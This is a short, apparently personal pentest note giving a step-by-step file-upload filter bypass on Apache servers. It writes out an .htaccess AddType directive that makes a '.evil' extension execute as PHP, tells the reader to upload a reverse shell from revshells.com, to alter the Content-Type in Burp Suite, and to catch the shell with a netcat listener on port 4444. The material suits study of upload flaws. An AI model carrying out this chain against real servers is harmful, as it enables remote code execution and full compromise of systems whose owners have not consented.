
_File upload vulnerability is a security flaw that arises when an application improperly handles user-uploaded files. This type of vulnerability can allow attackers to upload malicious files, which can lead to various exploits, such as executing arbitrary code, data theft, or even full server compromise._

1- do you have upload functionality that does not accept .php files?

if yes,
2- intercept it with burpsuite, does it that the backend is apache?
![600](Assets/Pasted%20image%2020250825005742.png)

if yes, 
3- then this can be bypass using “.htaccess” configuration file
reference: https://httpd.apache.org/docs/2.4/howto/htaccess.html


4- create ".htaccess" access file
```powershell
subl .htaccess
```

5- paste the following 
```powershell
AddType application/x-httpd-php .evil
```
press CTRL+s to save it and close it. 

confirm everything is file 
```powershell
cat .htaccess
```


It means any arbitrary file with extension “.evil” can run as PHP.

6- upload the created .htaccess
![600](Assets/Pasted%20image%2020250825010358.png)


7- let's visit https://www.revshells.com/ and create a reverse shell as following and copy it

![600](Assets/Pasted%20image%2020250825010650.png)


8- let's create reverse.evil
```powershell
subl reverse.evil
```

paste the reverse shell script content. 

9- upload reverse.evil and intercept the request. 

change `Content-Type` to "application/x-httpd-php"

then send it 


10- start a listener 
```powershell
rlwrap -cAr nc -lvnp 4444
```

11- trigger the reverse shell














